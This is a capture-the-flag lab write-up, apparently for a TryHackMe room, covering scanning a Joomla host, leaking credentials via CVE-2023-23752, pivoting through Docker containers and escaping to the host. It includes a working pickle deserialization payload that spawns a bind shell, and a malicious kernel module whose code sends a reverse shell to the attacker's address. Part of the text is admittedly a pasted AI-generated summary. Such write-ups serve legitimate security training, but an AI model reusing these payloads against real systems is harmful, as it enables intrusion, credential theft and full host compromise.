# Reconnaissance
## Nmap
```
nmap -p- -sV -sC -T4 -v 10.114.185.137
```
```
Scanning 10.114.185.137 [65535 ports]
Discovered open port 80/tcp on 10.114.185.137
Discovered open port 22/tcp on 10.114.185.137
Discovered open port 2222/tcp on 10.114.185.137

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 1B6942E22443109DAEA739524AB74123
|_http-generator: Joomla! - Open Source Content Management
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Home
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Gobuster
```
gobuster dir -u http://10.114.185.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt,bak,tar.gz -o gobuster_wyniki.txt -b 404,400
```
```
php                 (Status: 403) [Size: 279]
/media                (Status: 301) [Size: 316] [--> http://10.114.185.137/media/]
/templates            (Status: 301) [Size: 320] [--> http://10.114.185.137/templates/]
/modules              (Status: 301) [Size: 318] [--> http://10.114.185.137/modules/]
/images               (Status: 301) [Size: 317] [--> http://10.114.185.137/images/]
/index.php            (Status: 200) [Size: 8045]
/plugins              (Status: 301) [Size: 318] [--> http://10.114.185.137/plugins/]
/includes             (Status: 301) [Size: 319] [--> http://10.114.185.137/includes/]
/language             (Status: 301) [Size: 319] [--> http://10.114.185.137/language/]
/README.txt           (Status: 200) [Size: 4942]
/components           (Status: 301) [Size: 321] [--> http://10.114.185.137/components/]
/cache                (Status: 301) [Size: 316] [--> http://10.114.185.137/cache/]
/api                  (Status: 301) [Size: 314] [--> http://10.114.185.137/api/]
/libraries            (Status: 403) [Size: 279]
/robots.txt           (Status: 200) [Size: 764]
/tmp                  (Status: 301) [Size: 314] [--> http://10.114.185.137/tmp/]
/LICENSE.txt          (Status: 200) [Size: 18092]
/layouts              (Status: 301) [Size: 318] [--> http://10.114.185.137/layouts/]
/administrator        (Status: 301) [Size: 324] [--> http://10.114.185.137/administrator/]
/configuration.php    (Status: 200) [Size: 0]
/htaccess.txt         (Status: 200) [Size: 6858]
/cli                  (Status: 301) [Size: 314] [--> http://10.114.185.137/cli/]
/server-status        (Status: 403) [Size: 279]
```
### robots.txt
```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```
Sadly - my github got closed while I was editing, so nothing got saved. Ill post summary from gemini:
## New Target: Joomla 4.2.7 (CVE-2023-23752)

After moving laterally, we encountered a machine running Joomla. A scan using joomscan identified the version as 4.2.7, which is susceptible to a critical unauthenticated information disclosure vulnerability in its API.

    Scanning Command: joomscan --url http://10.112.151.128/

    API Exploitation: By appending the ?public=true parameter, we bypassed the "403 Forbidden" restriction on the API endpoint to leak the site's configuration.

    Command: curl "http://10.112.151.128/api/index.php/v1/config/application?public=true"

    Discovery (Credentials):

        Database User: root

        Database Password: RootPassword@1234

        Joomla Superuser: root

## SSH Access and Initial Foothold

Network reconnaissance revealed two SSH ports: 22 and 2222. The password recovered from the database configuration proved successful for the root user on port 2222.

    Command: ssh root@10.114.185.137 -p 2222

    Result: Gained root access within a Docker container (ID: f5eb774507f2).

## Internal Docker Pivoting

Operating as root inside the container, we performed an internal network sweep to identify other microservices within the 192.168.100.0/24 subnet.

    Network Sweep: nmap -sn 192.168.100.10/24

    Identified Target: 192.168.100.12 (voyage_priv2.joomla-net).

    Target Port Scan: nmap -p- -sV 192.168.100.12

    Discovery: Port 5000 was open, hosting the "Tourism Secret Finance Panel" powered by Python/Werkzeug.

## SSH Tunneling and Werkzeug Debugger

To access the internal web application from our local machine, we established an SSH tunnel using Local Port Forwarding.

    Tunnel Command: ssh -L 8888:192.168.100.12:5000 root@10.114.185.137 -p 2222

    Access: http://localhost:8888/

    Key Discovery: The application had the Werkzeug debugger enabled. Navigating to the /console endpoint revealed a locked interactive Python shell, providing a direct path toward Remote Code Execution (RCE).

## COuldnt get proper items for werkzeug PIN, so i went back to the session_data i found on localhost:8888
7. Bypassing Validation & Bind Shell (Insecure Deserialization)

The finance panel validated user sessions using serialized Python objects (Pickle) stored in the session_data cookie. Direct injection of a payload using os.system resulted in an application error (Invalid cookie header). This occurred because the server expected to deserialize a dictionary {'user': ..., 'revenue': ...}, but our payload returned the exit status code of the executed command instead. Additionally, we faced quote collision issues when attempting to pass complex shell commands.

To bypass this, we crafted a "Trojan Horse" payload. We created a malicious class that, upon deserialization, executed our shell in the background using eval() and immediately returned the expected dictionary structure to prevent the application from crashing. To avoid syntax errors with quotes, the Bind Shell payload was encoded in Base64.

    Payload Generation Script:

Python
```
import pickle
import base64

class RCE(dict):
    def __reduce__(self):
        # Clean Python bind shell code
        bind_shell = """import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("0.0.0.0",9999))
s.listen(1)
conn,addr=s.accept()
os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2)
subprocess.call(["/bin/sh","-i"])"""
        
        # Base64 encode to avoid quote collisions
        b64_shell = base64.b64encode(bind_shell.encode()).decode()
        
        # Decode and execute in the background
        cmd = f"echo {b64_shell} | base64 -d | python3"
        background_cmd = f"__import__('os').system('{cmd} &')"
        
        # eval() executes the background shell and returns the valid dictionary
        return (eval, (f"({background_cmd}, {{'user': 'root', 'revenue': '85000'}})[1]",))

print(pickle.dumps(RCE()).hex())
```
    Execution: We sent the generated hex string via a GET request using curl from our compromised jump-host container:

Bash
```
curl -i -X GET -H "Cookie: session_data=<PAYLOAD_HEX>" http://localhost:8888/
```
8. Initial Access & User Flag

The payload successfully opened port 9999 on the target container (192.168.100.12). Since the target Docker image was stripped down and lacked nc (netcat), we used socat from our jump-host container to connect to the bind shell.

    Connecting to the Bind Shell: ```bash
    socat - TCP:192.168.100.12:9999

* **Result:** Gained `root` access inside the finance application container (`voyage_priv2.joomla-net`).
* **Flag Discovery:** Navigating to the `/root/` directory, we retrieved the first flag:
  `THM{ee346612fb944085af0dd2cd677b1902}`

### 9. Enumeration & Discovering the Docker Escape Vector
Having compromised the container, the next objective was to escape to the underlying host machine (`10.112.151.128`). Checking the `/root/.bash_history` file revealed the actions of a previous user—specifically, the commands `make` and `insmod revshell.ko`. This was a massive clue indicating that the container had the `CAP_SYS_MODULE` capability, allowing it to load custom Linux Kernel Modules (LKMs) directly into the shared host kernel.

### 10. Compiling the LKM and Rooting the Host
To perform the escape, we wrote a malicious C module (`revshell.c`). We utilized the kernel function `call_usermodehelper`, which can execute user-space commands with full root privileges from within the kernel space, sending a reverse shell back to our Kali machine.

* **Module Source Code (`revshell.c`):**
```c
#include <linux/kmod.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");

static int __init revshell_init(void) {
    char *argv[] = { "/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.180.79/4445 0>&1", NULL };
    static char *envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    
    // Executes the command in the host's user space
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit revshell_exit(void) {
    printk(KERN_INFO "Revshell module unloaded.\n");
}

module_init(revshell_init);
module_exit(revshell_exit);

    Fixing the Kernel Headers Mismatch:
    During compilation, make initially failed because uname -r reported the kernel version as 6.8.0-1031-aws, but the /usr/src/ directory only contained headers for version 1030. To bypass this, we dynamically generated a Makefile that hardcoded the path to the existing 1030 headers.

    Generating the Makefile:

Bash

printf 'obj-m += revshell.o\n\nall:\n\tmake -C /usr/src/linux-headers-6.8.0-1030-aws M=$(PWD) modules\n\nclean:\n\tmake -C /usr/src/linux-headers-6.8.0-1030-aws M=$(PWD) clean\n' > Makefile

    Execution and Escape:
    After setting up a netcat listener on our attack machine (nc -lvnp 4445), we compiled and injected the kernel module:

Bash

make
insmod revshell.ko

    Result: The kernel module executed successfully on the host, granting us a fully privileged root reverse shell on the main underlying AWS instance.

    Final Flag: THM{ace91ec899f84498a74629b078bdceff}
